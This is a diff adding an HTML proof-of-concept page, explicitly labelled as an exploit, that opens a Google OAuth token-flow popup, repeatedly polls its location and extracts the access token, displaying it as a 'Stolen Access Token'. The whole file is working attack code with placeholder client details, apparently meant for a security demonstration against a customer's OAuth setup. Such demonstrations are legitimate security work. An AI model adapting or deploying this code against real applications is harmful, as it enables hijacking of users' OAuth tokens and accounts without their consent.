@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f2f2f2;
+            height: 100vh;
+        }
+
+        button {
+            padding: 15px 25px;
+            background-color: #4CAF50;
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+    </style>
+
+<script>
+// --- UTILS: Get URL parameters if needed
+function getParameterByName(name, url) {
+    if (!url) url = window.location.href;
+    name = name.replace(/[\[\]]/g, "\\$&");
+    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+        results = regex.exec(url);
+    if (!results) return null;
+    if (!results[2]) return '';
+    return decodeURIComponent(results[2].replace(/\+/g, " "));
+}
+
+// --- MAIN EXPLOIT
+let popup;
+let monitorInterval;
+
+function launch() {
+    // --- CHANGE THIS URL to their real OAuth URL
+    let realOAuthURL = "https://accounts.google.com/o/oauth2/v2/auth?client_id=CUSTOMER_CLIENT_ID&redirect_uri=CUSTOMER_REDIRECT_URI&response_type=token&scope=email%20profile";
+
+    popup = window.open(realOAuthURL, "popupWindow", "width=500,height=600");
+
+    // Delay to allow popup to fully load
+    setTimeout(() => {
+        monitorPopup();
+    }, 1500);
+}
+
+function monitorPopup() {
+    monitorInterval = setInterval(() => {
+        try {
+            if (!popup || popup.closed) {
+                console.log("Popup closed.");
+                clearInterval(monitorInterval);
+                return;
+            }
+
+            let popupUrl = popup.location.href;
+
+            // Check if redirected back to redirect_uri with access token
+            if (popupUrl.includes("access_token=")) {
+                console.log("[+] OAuth token detected!");
+
+                // Extract token
+                let token = getParameterByName('access_token', popupUrl);
+                console.log("[+] Stolen Access Token:", token);
+
+                alert("Stolen Access Token: " + token);
+
+                // OPTIONAL: Close popup after stealing
+                popup.close();
+                clearInterval(monitorInterval);
+            } else {
+                console.log("Watching popup:", popupUrl);
+            }
+        } catch (e) {
+            // CORS security will block us until redirect happens
+            console.log("Waiting for same-origin...", e.message);
+        }
+    }, 100);
+}
+</script>
+
+</head>
+<body>
+    <button onclick="launch()">Launch Attack 🚀</button>
+</body>
+</html>
